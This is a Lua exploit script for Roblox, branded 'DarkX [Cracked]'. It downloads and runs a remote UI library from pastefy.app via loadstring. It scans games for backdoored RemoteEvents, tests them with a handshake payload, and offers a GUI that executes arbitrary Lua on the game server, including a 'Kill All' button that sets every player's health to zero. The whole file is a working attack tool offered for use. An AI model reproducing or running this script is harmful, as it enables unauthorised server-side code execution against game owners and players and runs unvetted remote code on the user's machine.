local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer
local library = loadstring(game:HttpGet("https://pastefy.app/OSBCAixJ/raw"))()
local activeRemote = nil
local possibleRemoteNames = {
    "ExecuteRemote", "G_Execute", "ServerSide", "RemoteEvent", 
    "DataRemote", "Handshake", "Execute", "MessagingService"
}
local function findBackdoor()
    print("DarkX: Scanning for server-side vulnerabilities...")
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            for _, name in pairs(possibleRemoteNames) do
                if v.Name == name or v.Name:match(name) then
                    local success = pcall(function()
                        v:FireServer("print('DarkX Handshake Verified')")
                    end)
                    if success then
                        activeRemote = v
                        return true
                    end
                end
            end
        end
    end
    return false
end
local function initExecutor()
    local mainWin = library:new("DarkX [Cracked]")
    local execTab = mainWin:Tab("Executor", "123456")
    local mainSec = execTab:section("Main")
    mainSec:Label("Backdoor Found: " .. (activeRemote and activeRemote.Name or "None"))
    local codeBox = ""
    mainSec:TextBox("Enter Lua Code", "print('Hello World')", function(val)
        codeBox = val
    end)
    mainSec:Button("Execute (Server-Side)", function()
        if activeRemote then
            activeRemote:FireServer(codeBox)
            print("DarkX: Code sent to server.")
        else
            warn("DarkX: No active backdoor found in this game.")
        end
    end)
    local utilTab = mainWin:Tab("Utilities", "654321")
    local utilSec = utilTab:section("Quick Actions")
    utilSec:Button("Kill All (Requires SS)", function()
        if activeRemote then
            activeRemote:FireServer([[
                for _, p in pairs(game.Players:GetPlayers()) do
                    if p.Character and p.Character:FindFirstChild("Humanoid") then
                        p.Character.Humanoid.Health = 0
                    end
                end
            ]])
        end
    end)
    utilSec:Button("Re-Scan Game", function()
        findBackdoor()
    end)
end
if findBackdoor() then
    initExecutor()
else
    warn("DarkX: Universal scan failed. Game may not be vulnerable.")
    initExecutor()
end
